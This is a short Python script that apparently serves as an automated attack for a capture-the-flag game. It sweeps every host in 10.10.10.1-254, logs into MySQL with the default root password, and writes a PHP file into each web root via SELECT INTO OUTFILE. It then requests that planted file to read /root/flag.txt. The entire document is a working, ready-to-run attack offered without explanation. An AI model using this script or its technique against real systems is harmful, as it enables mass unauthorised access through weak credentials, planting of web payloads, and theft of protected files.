import MySQLdb,threading,sys,httplib

def sqli(h):
	try:
		db=MySQLdb.connect(h,"root","123456","mysql",charset='utf8')
		cursor=db.cursor()
		s="""select "<?php echo file_get_contents('/root/flag.txt');?>" into outfile "/var/www/html/rf1.php";"""
		cursor.execute(s)
		db.commit()
	except Exception as e:
		sys.exit()
	try:
		u='http://'+str(h)+'/rf1.php'
		c=httplib.HTTPConnection(h)
		c.request(method="GET",url=u)
		res=c.getresponse()
		print(h)
		print(res.read())
		sys.exit()
	except Exception as e:
		sys.exit()

if __name__ == '__main__':
	a=1
	while a<=254:
		h='10.10.10.'+str(a)
		t=threading.Thread(target=sqli,args=(h,))
		t.start()
		a=a+1